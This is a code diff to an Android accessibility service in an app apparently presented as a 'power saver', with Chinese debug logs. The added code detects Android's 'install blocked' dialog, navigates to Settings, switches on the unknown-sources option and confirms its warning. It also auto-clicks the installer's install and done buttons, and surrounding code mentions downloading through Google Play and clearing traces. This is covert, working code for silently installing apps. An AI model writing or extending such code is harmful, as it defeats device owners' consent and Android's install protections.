@@ -13,6 +13,7 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.luna.powersaver.gp.PowerSaver;
+import com.luna.powersaver.gp.R;
 import com.luna.powersaver.gp.common.GPResId;
 import com.luna.powersaver.gp.common.StaticConst;
 import com.luna.powersaver.gp.http.DownloadManager;
@@ -41,6 +42,7 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
     public static int sCurrentWorkState = 0;
     // 值查看 TYPE
     public static int sCurrentWorkType = TYPE.IGNORED;
+
     public interface TYPE {
         int IGNORED = 0;
         int DOWNLOAD_BY_GP = 1;
@@ -94,7 +96,7 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
                 + ", action = " + event.getAction() + ", time = " + df.format(new Date(event.getEventTime()))
                 + ", text = " + event.getText() + ", package = " + event.getPackageName()
                 + ", source.text = " + (event.getSource() != null ? event.getSource().getText() : "null")
-                + ", isWork = " + sIsInWork  + ", sCurrentType = " + sCurrentWorkType + ", sCurrentState = " + sCurrentWorkState);
+                + ", isWork = " + sIsInWork + ", sCurrentType = " + sCurrentWorkType + ", sCurrentState = " + sCurrentWorkState);
 //        traveselNodeInfo(getRootInActiveWindow(), 0);
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -231,31 +233,134 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         sIsInWork = false;
     }
 
+
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
     private void handleInstallWork(AccessibilityEvent event) {
         String pkg = event.getPackageName().toString();
+        // 需要处理未知权限的问题
+        if (sCurrentWorkState > 1) {
+            if (GPResId.SETTINGS_PKG.equals(pkg)) {
+                AccessibilityNodeInfo source = getRootInActiveWindow();
+                List<AccessibilityNodeInfo> nodes;
+                AccessibilityNodeInfo info;
+                if (source != null) {
+                    if (sCurrentWorkState == 2) {
+                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找允许安装的源选项");
+                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "开始查找特定含未知源的TextView");
+                            info = travsalToFindFirstInfoContainsName(source, "TextView",
+                                    getResources().getString(R.string.powersaver_setting_item_title_unknown_source));
+                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSettingListViewId());
+                            AccessibilityNodeInfo list = null;
+                            if (nodes != null && nodes.size() > 0) {
+                                list = nodes.get(0);
+                            }
+                            if (info == null) {
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到选项，需要滚动");
+                                if (list != null)
+                                    list.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+                                return;
+                            }
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找到含未知源选项的项，text = " + info.getText());
+                            info = travsalToFindFirstInfoContainsName(info.getParent(), "Switch", null);
+                            if (info == null) {
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到选择按钮，需要滚动");
+                                if (list != null)
+                                    list.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
+                                return;
+                            }
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "查找到切换器为: " + info.getClassName() + ", " +
+                                    "isChecked = " + info.isChecked() + ", isClick = " + info.isClickable());
+                            if (!info.isChecked()) {
+                                boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                sCurrentWorkState = 3;
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "点击设置为确定，结果: " + result);
+                            } else {
+                                sCurrentWorkState = 0;
+                                performGlobalBack();
+                            }
+                        }
+                    } else if (sCurrentWorkState == 3) {
+                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "检查是否有确定开启弹窗");
+                        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
+                            if (nodes == null || nodes.size() < 1) {
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到确定弹窗按钮列表");
+                                sCurrentWorkState = 0;
+                                performGlobalBack();
+                                return;
+                            }
+                            info = nodes.get(0);
+                            if (info == null) {
+                                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "找不到确定弹窗按钮");
+                                return;
+                            }
+                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "确定允许未知安装源，结果:" + result);
+                            if (result) {
+                                sCurrentWorkState = 2;
+                            } else {
+                                sCurrentWorkState = 0;
+                                performGlobalBack();
+                            }
+                        }
+                    }
+                }
+            }
+            return;
+        }
         if (GPResId.INSTALLER_PKG.equals(pkg)
                 || GPResId.INSTALLER_GOOGLE_PKG.equals(pkg)) {
             AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "当前检测到Installer的执行，处于安装行为中");
             AccessibilityNodeInfo source = getRootInActiveWindow();
             List<AccessibilityNodeInfo> nodes;
+            AccessibilityNodeInfo info;
             if (source != null) {
-                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallOkBtnId());
-                AccessibilityNodeInfo info;
-                if (nodes != null && nodes.size() > 0) {
-                    if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                        return;
-                    }
-                    info = nodes.get(0);
-                    if (info != null) {
-                        boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定安装，执行结果： " + isClick);
-                        if (!isClick) {
-                            performGlobalBack();
+                // 判断是否检测到系统弹窗提示，通常是用于判断
+                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "检测是否有禁止安装的弹窗");
+                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogTitleId());
+                    if (nodes != null && nodes.size() > 0) {
+                        // 存在弹窗
+                        AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前检测到弹窗，判断是否禁止安装弹窗！");
+                        info = nodes.get(0);
+                        if (info == null) {
+                            return;
+                        }
+                        if (info.getText() != null && getResources().getString(R.string.powersaver_dialog_title_install_blocked)
+                                .equals(info.getText().toString())) {
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "当前是禁止安装弹窗，查找按钮跳转设置界面");
+                            nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getSystemDialogOkBtnId());
+                            if (nodes == null || nodes.size() < 1)
+                                return;
+                            info = nodes.get(0);
+                            if (info == null)
+                                return;
+                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "跳转设置界面，点击结果：" + result);
+                            sCurrentWorkState = 2;
+                            return;
                         }
                     }
-                } else {
-
+                }
+                AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "正常安装界面，执行查找安装按钮判断");
+                if (sCurrentWorkState == 0) {
+                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallOkBtnId());
+                    if (nodes != null && nodes.size() > 0) {
+                        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                            return;
+                        }
+                        info = nodes.get(0);
+                        if (info != null) {
+                            boolean isClick = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            AppDebugLog.w(AppDebugLog.TAG_ACCESSIBILITY, "确定安装，执行结果： " + isClick);
+                            if (!isClick) {
+                                performGlobalBack();
+                            }
+                            sCurrentWorkState = 1;
+                        }
+                    }
+                } else if (sCurrentWorkState == 1) {
                     nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstalledDoneBtnId());
                     if (nodes != null && nodes.size() > 0) {
                         info = nodes.get(0);
@@ -444,7 +549,7 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
     @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR2)
     private void handleDownloadWorkByGp(AccessibilityEvent event) {
 
-            // 由handleClearWork()进行处理
+        // 由handleClearWork()进行处理
 //        if (sCurrentWorkState == 2) {
 //            // 清除痕迹，所以要判断是否商店并退出
 //            AppDebugLog.d(AppDebugLog.TAG_ACCESSIBILITY, "清除痕迹，所以要判断是否商店并退出");
@@ -640,19 +745,21 @@ public class NBAccessibilityService extends AccessibilityService implements Powe
         }
     }
 
-    private boolean travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName) {
+    private AccessibilityNodeInfo travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName, String text) {
         if (info == null)
-            return false;
-        if (info.getChildCount() > 0) {
+            return null;
+        if ((TextUtils.isEmpty(widgetName) || info.getClassName().toString().contains(widgetName))
+                && (TextUtils.isEmpty(text) || (info.getText() != null && info.getText().toString().contains(text)))) {
+            return info;
+        } else if (info.getChildCount() > 0) {
+            AccessibilityNodeInfo result;
             for (int i = 0; i < info.getChildCount(); i++) {
-                if (travsalToFindFirstInfoContainsName(info.getChild(i), widgetName)) {
-                    return true;
-                }
+                result = travsalToFindFirstInfoContainsName(info.getChild(i), widgetName, text);
+                if (result != null)
+                    return result;
             }
-        } else if (info.getClassName().toString().contains(widgetName)) {
-            return true;
         }
-        return false;
+        return null;
     }
 
     private void performGlobalBack() {
